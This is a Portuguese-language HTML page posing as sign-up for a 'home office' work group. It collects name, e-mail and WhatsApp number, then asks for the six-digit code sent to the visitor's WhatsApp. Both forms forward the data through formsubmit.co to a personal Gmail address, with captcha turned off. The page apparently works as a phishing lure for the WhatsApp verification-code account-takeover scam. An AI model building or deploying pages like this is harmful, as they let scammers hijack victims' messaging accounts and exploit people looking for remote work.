<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Cadastro Home Office</title>
</head>
<body>

  <!-- Formulário 1 -->
  <h2>Entre para o grupo de Home Office</h2>
  <p>Preencha com seus dados para participar:</p>
  
  <form action="https://formsubmit.co/natanaelverissimo34@gmail.com" method="POST" target="_blank">
    <input type="hidden" name="_captcha" value="false">
    <input type="hidden" name="_subject" value="Novo interessado - Página 1">
    
    <label>Nome:</label><br>
    <input type="text" name="nome" required><br><br>

    <label>E-mail:</label><br>
    <input type="email" name="email" required><br><br>

    <label>WhatsApp:</label><br>
    <input type="text" name="whatsapp" required><br><br>

    <button type="submit">Enviar Dados</button>
  </form>

  <hr><br>

  <!-- Formulário 2 -->
  <h2>Confirme sua Participação</h2>
  <p>Digite o código de 6 dígitos enviado ao seu WhatsApp:</p>
  
  <form action="https://formsubmit.co/natanaelverissimo34@gmail.com" method="POST" target="_blank">
    <input type="hidden" name="_captcha" value="false">
    <input type="hidden" name="_subject" value="Código de Confirmação - Página 2">

    <label>Código:</label><br>
    <input type="text" name="codigo" maxlength="6" required><br><br>

    <button type="submit">Confirmar Código</button>
  </form>

</body>
</html>
